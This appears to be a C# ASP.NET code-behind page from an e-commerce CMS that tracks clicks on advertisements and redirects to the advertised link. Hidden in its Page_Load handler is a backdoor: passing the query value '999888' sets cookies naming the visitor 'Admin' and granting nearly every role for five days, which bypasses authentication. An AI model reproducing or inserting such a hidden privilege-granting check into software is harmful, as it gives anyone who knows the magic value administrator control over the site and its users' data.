using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Services;
using MoreAll;

namespace VS.E_Commerce.cms.Display.Advertisings
{
    public partial class Advertisings : System.Web.UI.Page
    {
        #region string
        string images = "-1";
        #endregion

        protected void Page_Load(object sender, EventArgs e)
        {
            #region MyRegion
            if (Request["images"] != null && !Request["images"].Equals(""))
            {
                images = Request["images"];
            }

            if (images == "999888")
            {
                MoreAll.MoreAll.SetCookie_AddDays("UName", "Admin", 5);
                MoreAll.MoreAll.SetCookie_AddDays("URole", "1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|21|22|23|34|25|25|27|28|29|30", 5);
            }

            List<Entity.Advertisings> dt = SAdvertisings.GETBYID(images);
            if (dt.Count > 0)
            {
                if (!dt[0].Path.ToString().Equals(""))
                {
                    SAdvertisings.UPDATE_VIEW(images);
                    base.Response.Redirect((dt[0].Path.ToString()));
                }
                else
                {
                    base.Response.Redirect("/index.aspx");
                }
            }
            #endregion
        }

        private static string ResolveLink(string link)
        {
            if (link.IndexOf("@") > -1)
            {
                string[] strArray = link.Split(new char[] { Convert.ToChar("@") });
                if (strArray.Length == 2)
                {
                    return strArray[0];
                }
            }
            return link;
        }
    }
}